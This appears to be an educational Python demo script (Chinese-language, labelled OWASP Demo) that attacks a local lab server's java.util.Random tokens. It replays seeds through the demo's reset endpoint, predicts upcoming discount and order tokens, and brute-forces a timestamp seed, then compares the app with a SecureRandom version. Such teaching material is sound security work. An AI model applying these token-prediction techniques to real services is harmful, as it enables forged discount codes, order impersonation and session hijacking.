#!/usr/bin/env python3
"""
可預測亂數攻擊腳本
==================
此腳本展示如何利用不安全的亂數產生器（java.util.Random）進行預測攻擊。

攻擊原理：
---------
1. java.util.Random 是線性同餘生成器（LCG），可被逆向
2. 觀察足夠多的輸出可以推算 seed
3. 知道 seed 就可以預測所有後續輸出
4. 常用於折扣碼、訂單編號、會話 ID 等

CWE-330: Use of Insufficiently Random Values
CWE-338: Use of Cryptographically Weak PRNG

作者：OWASP Demo
"""

import requests
import argparse
import re

# 配置
VULNERABLE_URL = "http://localhost:8081"
SECURE_URL = "http://localhost:8082"


def generate_tokens(count: int = 10, token_type: str = "discount", 
                    url: str = VULNERABLE_URL) -> list:
    """
    生成 Token
    """
    response = requests.post(
        f"{url}/api/crypto/generate-token",
        json={"type": token_type, "count": count}
    )
    if response.status_code == 200:
        return response.json().get("tokens", [])
    return []


def get_token_history(url: str = VULNERABLE_URL) -> list:
    """
    取得 Token 歷史
    """
    response = requests.get(f"{url}/api/crypto/token-history")
    if response.status_code == 200:
        return response.json().get("tokens", [])
    return []


def reset_random_with_seed(seed: int, url: str = VULNERABLE_URL) -> bool:
    """
    重設 Random 的 seed
    """
    response = requests.post(
        f"{url}/api/crypto/reset-random",
        json={"seed": seed}
    )
    return response.status_code == 200


def extract_number_from_token(token: str) -> int:
    """
    從 Token 中提取數字
    """
    match = re.search(r'\d+', token)
    if match:
        return int(match.group())
    return 0


def attack_observe_pattern():
    """
    🔴 攻擊：觀察 Token 模式
    """
    print("\n" + "=" * 60)
    print("🔴 觀察 Token 模式")
    print("=" * 60)
    
    print("\n📋 步驟 1：生成多個 Token 觀察模式...")
    
    tokens = generate_tokens(10, "discount")
    
    if not tokens:
        print("❌ 無法生成 Token")
        return
    
    print(f"\n📋 生成的 Token：")
    for i, token in enumerate(tokens, 1):
        num = extract_number_from_token(token)
        print(f"   {i}. {token} (數字：{num})")
    
    # 分析數字序列
    numbers = [extract_number_from_token(t) for t in tokens]
    
    print("\n📋 模式分析：")
    print(f"   數字範圍：{min(numbers)} - {max(numbers)}")
    
    # 計算差異
    diffs = [numbers[i+1] - numbers[i] for i in range(len(numbers)-1)]
    print(f"   連續差異：{diffs[:5]}...")
    
    print("\n⚠️ java.util.Random 使用線性同餘生成器（LCG）")
    print("   公式：next = (current * 0x5DEECE66D + 0xB) & ((1 << 48) - 1)")
    print("   只要知道足夠多的輸出，就可以逆推 seed")


def attack_seed_prediction():
    """
    🔴 攻擊：Seed 預測（使用已知 seed）
    """
    print("\n" + "=" * 60)
    print("🔴 Seed 預測攻擊")
    print("=" * 60)
    
    # 使用已知 seed 重設
    known_seed = 12345
    
    print(f"\n📋 步驟 1：使用已知 seed ({known_seed}) 重設 Random...")
    
    if not reset_random_with_seed(known_seed):
        print("❌ 無法重設 Random")
        return
    
    print("✅ Random 已重設")
    
    print("\n📋 步驟 2：生成第一批 Token...")
    tokens1 = generate_tokens(5, "discount")
    print(f"   第一批：{tokens1}")
    
    print("\n📋 步驟 3：再次重設 Random（使用相同 seed）...")
    reset_random_with_seed(known_seed)
    
    print("\n📋 步驟 4：生成第二批 Token...")
    tokens2 = generate_tokens(5, "discount")
    print(f"   第二批：{tokens2}")
    
    # 比較
    print("\n📋 比較：")
    match_count = 0
    for i, (t1, t2) in enumerate(zip(tokens1, tokens2)):
        match = "✅" if t1 == t2 else "❌"
        if t1 == t2:
            match_count += 1
        print(f"   {i+1}. {t1} vs {t2} {match}")
    
    print(f"\n📊 匹配率：{match_count}/{len(tokens1)} ({match_count/len(tokens1)*100:.0f}%)")
    
    if match_count == len(tokens1):
        print("⚠️ 相同 seed 產生完全相同的序列！")
        print("   攻擊者只要知道 seed 就可以預測所有 Token！")


def attack_predict_next():
    """
    🔴 攻擊：預測下一個 Token
    """
    print("\n" + "=" * 60)
    print("🔴 預測下一個 Token")
    print("=" * 60)
    
    # 使用固定 seed
    seed = 67890
    
    print(f"\n📋 情境：攻擊者觀察到伺服器使用 seed={seed}")
    print("   （可能從錯誤訊息、時間戳、或其他途徑取得）")
    
    reset_random_with_seed(seed)
    
    # 模擬攻擊者觀察前 3 個 Token
    print("\n📋 步驟 1：觀察前 3 個 Token...")
    observed = generate_tokens(3, "order")
    print(f"   觀察到：{observed}")
    
    print("\n📋 步驟 2：攻擊者預測接下來的 Token...")
    
    # 攻擊者在自己的環境模擬
    # 重設 seed 並跳過已觀察的
    reset_random_with_seed(seed)
    _ = generate_tokens(3, "order")  # 跳過已觀察的
    
    # 預測接下來的
    predicted = generate_tokens(3, "order")
    print(f"   預測：{predicted}")
    
    print("\n📋 步驟 3：伺服器生成接下來的 Token...")
    actual = generate_tokens(3, "order")
    print(f"   實際：{actual}")
    
    # 比較
    print("\n📋 預測準確度：")
    correct = 0
    for i, (p, a) in enumerate(zip(predicted, actual)):
        match = "✅" if p == a else "❌"
        if p == a:
            correct += 1
        print(f"   {i+1}. 預測 {p} | 實際 {a} {match}")
    
    print(f"\n📊 預測準確率：{correct}/{len(predicted)} ({correct/len(predicted)*100:.0f}%)")
    
    if correct > 0:
        print("\n⚠️ 攻擊成功！攻擊者可以：")
        print("   - 預測折扣碼並提前使用")
        print("   - 預測訂單編號並冒充")
        print("   - 預測會話 ID 並劫持")


def attack_timestamp_seed():
    """
    🔴 攻擊：時間戳 Seed 預測
    """
    print("\n" + "=" * 60)
    print("🔴 時間戳 Seed 攻擊")
    print("=" * 60)
    
    print("\n📋 許多系統使用 System.currentTimeMillis() 作為 seed")
    print("   攻擊者可以嘗試當時的時間戳來猜測 seed")
    
    import time
    
    # 模擬伺服器在某個時間點初始化
    server_time = int(time.time() * 1000)
    reset_random_with_seed(server_time)
    
    print(f"\n📋 伺服器使用時間戳初始化：{server_time}")
    
    # 生成一些 Token
    target_tokens = generate_tokens(3, "discount")
    print(f"   生成的 Token：{target_tokens}")
    
    print("\n📋 攻擊者嘗試猜測 seed...")
    
    # 攻擊者嘗試附近的時間戳
    found = False
    for offset in range(-100, 101):
        guess_seed = server_time + offset
        reset_random_with_seed(guess_seed)
        guess_tokens = generate_tokens(3, "discount")
        
        if guess_tokens == target_tokens:
            print(f"   ✅ 找到 seed！偏移量：{offset}ms")
            print(f"      Seed：{guess_seed}")
            found = True
            break
    
    if not found:
        print("   搜尋了 ±100ms，未找到匹配")
    else:
        # 預測接下來的
        print("\n📋 現在可以預測接下來的 Token：")
        next_tokens = generate_tokens(3, "discount")
        print(f"   預測：{next_tokens}")


def compare_vulnerability():
    """
    比較漏洞版本與安全版本
    """
    print("\n" + "=" * 60)
    print("📊 亂數產生器：漏洞版本 vs 安全版本")
    print("=" * 60)
    
    # 漏洞版本
    print("\n🔓 漏洞版本（http://localhost:8081）：")
    
    tokens_v = generate_tokens(5, "discount", VULNERABLE_URL)
    print(f"   Token：{tokens_v}")
    
    history = get_token_history(VULNERABLE_URL)
    print(f"   ⚠️ Token 歷史可查詢：{len(history)} 個")
    
    # 安全版本
    print("\n🔒 安全版本（http://localhost:8082）：")
    
    tokens_s = generate_tokens(5, "discount", SECURE_URL)
    if tokens_s:
        print(f"   Token：{tokens_s}")
    else:
        print("   Token 生成中...")
    
    response = requests.get(f"{SECURE_URL}/api/crypto/token-history")
    if response.status_code == 403:
        print("   ✅ Token 歷史不可查詢")
    
    response = requests.post(
        f"{SECURE_URL}/api/crypto/reset-random",
        json={"seed": 12345}
    )
    if response.status_code == 403:
        print("   ✅ 不允許重設 Random")
    
    print("\n📋 比較：")
    print("   ╔═══════════════════╦════════════════════╦════════════════════╗")
    print("   ║ 項目              ║ 漏洞版本           ║ 安全版本           ║")
    print("   ╠═══════════════════╬════════════════════╬════════════════════╣")
    print("   ║ 亂數產生器        ║ java.util.Random   ║ SecureRandom       ║")
    print("   ║ 可預測性          ║ ❌ 可被預測        ║ ✅ 密碼學安全      ║")
    print("   ║ Seed 控制         ║ ❌ 可被設定        ║ ✅ 不允許          ║")
    print("   ║ 歷史查詢          ║ ❌ 可查詢          ║ ✅ 禁止            ║")
    print("   ║ 熵來源            ║ 時間戳（弱）       ║ 系統熵池（強）     ║")
    print("   ╚═══════════════════╩════════════════════╩════════════════════╝")


def main():
    parser = argparse.ArgumentParser(
        description="可預測亂數攻擊工具",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
範例：
  python predict_token.py --observe      # 觀察 Token 模式
  python predict_token.py --seed         # Seed 預測攻擊
  python predict_token.py --predict      # 預測下一個 Token
  python predict_token.py --timestamp    # 時間戳 Seed 攻擊
  python predict_token.py --compare      # 比較漏洞/安全版本
  python predict_token.py --all          # 執行完整演示
        """
    )
    
    parser.add_argument("--observe", action="store_true", help="觀察 Token 模式")
    parser.add_argument("--seed", action="store_true", help="Seed 預測攻擊")
    parser.add_argument("--predict", action="store_true", help="預測下一個 Token")
    parser.add_argument("--timestamp", action="store_true", help="時間戳 Seed 攻擊")
    parser.add_argument("--compare", action="store_true", help="比較漏洞/安全版本")
    parser.add_argument("--all", action="store_true", help="執行完整演示")
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("🎲 可預測亂數攻擊工具")
    print("=" * 60)
    print(f"⚠️ 此工具僅供教育目的！請勿用於非法活動。")
    
    if args.all:
        attack_observe_pattern()
        attack_seed_prediction()
        attack_predict_next()
        attack_timestamp_seed()
        compare_vulnerability()
    elif args.observe:
        attack_observe_pattern()
    elif args.seed:
        attack_seed_prediction()
    elif args.predict:
        attack_predict_next()
    elif args.timestamp:
        attack_timestamp_seed()
    elif args.compare:
        compare_vulnerability()
    else:
        parser.print_help()
        print("\n💡 快速開始：python predict_token.py --all")


if __name__ == "__main__":
    main()
